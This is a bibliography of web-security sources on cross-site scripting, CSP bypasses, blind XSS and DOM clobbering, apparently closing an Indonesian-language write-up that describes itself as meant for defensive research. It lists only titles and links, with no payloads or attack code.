- Youssef Sammouda. "Multiple XSS in Meta Conversion API Gateway Leading to Zero-Click Account Takeover." https://ysamm.com/uncategorized/2025/01/13/capig-xss.html
- Bugcrowd Blog. "The guide to blind XSS." https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/
- Intigriti Blog. "CSP Bypasses: Advanced Exploitation Guide." https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses
- Jorian Woltjer. "Nonce CSP bypass using Disk Cache." https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache
- Node.js Security. "How I found an XSS in the Nuxt MDC Library for Markdown Content." https://www.nodejs-security.com/blog/nuxt-mdc-xss-vulnerability
- W3C Blog. "How to protect your Web applications from XSS (2025)." https://www.w3.org/blog/2025/how-to-protect-your-web-applications-from-xss/
- The Hacker News. "Why React Didn't Kill XSS: The New JavaScript Injection Playbook." https://thehackernews.com/2025/07/why-react-didnt-kill-xss-new-javascript.html
- BroadChannel. "XSSGAI and AI-Generated XSS: Why Traditional WAF Rules Are Obsolete in 2025." https://broadchannel.org/xssgai-ai-generated-xss-waf-bypass/
- OWASP. "XSS Filter Evasion Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- OWASP. "DOM Clobbering Prevention Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
- HackTricks. "Cross Site Scripting (XSS)." https://book.hacktricks.wiki/pentesting-web/xss-cross-site-scripting
- tttang. "A Magic Way of XSS in HTTP/2" (2022) — Vector XSS yang mengeksploitasi karakteristik HTTP/2 binary framing dan header compression

---

*Dokumen ini dibuat untuk tujuan defensive security research dan vulnerability understanding.*